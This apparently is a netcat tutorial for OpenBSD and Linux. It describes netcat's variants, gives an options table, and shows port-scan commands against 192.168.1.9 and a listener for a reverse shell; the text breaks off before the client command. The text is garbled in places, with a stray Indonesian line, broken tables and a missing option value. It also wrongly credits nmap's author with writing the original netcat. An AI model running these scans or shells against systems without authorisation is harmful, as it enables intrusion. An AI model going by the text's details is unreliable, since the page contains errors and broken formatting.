## 1. What is Netcat
Are you having trouble or confusion when using the ‘nc’ command in OpenBSD? You are not alone. Many developers also find themselves confused when it comes to using this versatile tool for network connections. Think of ‘nc’ or Netcat as a pocket knife for your networking needs. The nc command can read and write data across a network, making it an indispensable tool for any OpenBSD user.

Jadi, mari selami dan mulai kuasai perintah `‘nc’` di **OpenBSD!**.

## 2. Netcat Version
It just so happens that Netcat has many variants written by different authors. The original version was called netcat (nc). Netcat quickly gained recognition, but at some point its author stopped developing it and, despite its popularity, no one else started supporting it. For this reason, the program was rewritten several times by different authors, and sometimes completely from scratch.

The last original version of netcat was released in January 2007. The version used was 1.10. The original version of netcat was written by the author of the famous nmap program.

Ncat has become the official replacement for the original netcat in some Linux distributions, such as Red Hat Enterprise Linux, CentOS, which are often used as web servers. For this reason, you will find Ncat on many computers in the network for example, on my virtual hosting, Ncat is installed as Netcat.

Ncat is shipped in the Nmap package and is therefore available for a variety of platforms, including Windows. This means that to install Ncat on Windows, simply install NMap.

## 3. Basic netcat commands
As you become more familiar with the nc command and become more proficient in using it, you will discover the true power of nc, as it has many advanced features. The flexibility of the ‘nc’ command allows you to handle more complex networking tasks, such as creating a simple chat server or transferring files between systems.

Before we dive into the use of the ‘nc’ command, let’s get to know some of the arguments or command lines that can unlock advanced features of the ‘nc’ command. Here is a table with some of the most commonly used ‘nc’ arguments.

The table below outlines common nc command options:

| Option	    | Type	        | Description   |
| ----------- | -----------   | -----------   |
| -4	| Protocol	| Use IPv4 only. |
| -6	| Protocol	| Use IPv6 only. |
| -U,  --unixsock	| Protocol	| Use Unix domain sockets. |
| -u,  --udp	| Protocol	| Use UDP connection. |
| -g <hop1, hop2,...>	| Connect mode	| Set hops for loose source routing in IPv4. Hops are IP addresses or hostnames. |
| -p <port>,  --source-port <port>	| Connect mode	| Binds the Netcat source port to <port>. |
| -s <host>,  --source <host>	| Connect mode	| Binds the Netcat host to <host>. |
| -l,  --listen	| Listen mode	| Listens for connections instead of using connect mode. |
| -k,  --keep-open	| Listen mode	| Keeps the connection open for multiple simultaneous connections. |
| -v,  --verbose	 | Output	| Sets verbosity level. Use multiple times to increase verbosity. |
| -z	| Output	| Report connection status without establishing a connection. |


## 4. Basic Usage of NC Linux Commands: Step by Step Guide
Let’s start with the basics. The **‘nc’** command, also known as Netcat, can be used to create a simple network connection. This can be very useful for testing network connectivity or transferring small amounts of data.

Here is a basic example of how to use the ‘nc’ command:

| Option       | Command          | description        | 
| ----------- | -----------   | ----------- |

| -z          | nc -z      | 192.168.1.9 1-100	Port scan for a host or IP address          |
| -v          | nc -zv     | 192.168.1.9 1-100	Provide verbose output          |
| -n          | nc -zn          | 192.168.1.9 1-100	Fast scan by disabling DNS resolution          |
| -l          | nc -lp          | 8000	TCP Listen mode (for inbound connects)          |
| -w          | nc -w          | 180 192.168.1.9 8000	Define timeout value          |
| -k          | nc -kl          | 8000	Continue listening after disconnection          |
| -u          | nc -u          | 192.168.1.9 8000	Use UDP instead of TCP          |
| -q          | nc -q          | 192.168.1.9 8000	Client stay up after EOF          |
| -4          | nc -4          | 8000	IPv4 only          |
| -6          | nc -6          | 8000	IPv6 only          |

```

Client
```console
$ nc 192.168.1.9 8000
```

**Note:** We have used remote shell using telnet and ssh but what if both are not installed and we don't have permission to install them then we can create remote shell using netcat also.

### l. Reverse shell
Server (192.168.1.9)
```console
$ nc -lv 8000
```

Client
```console
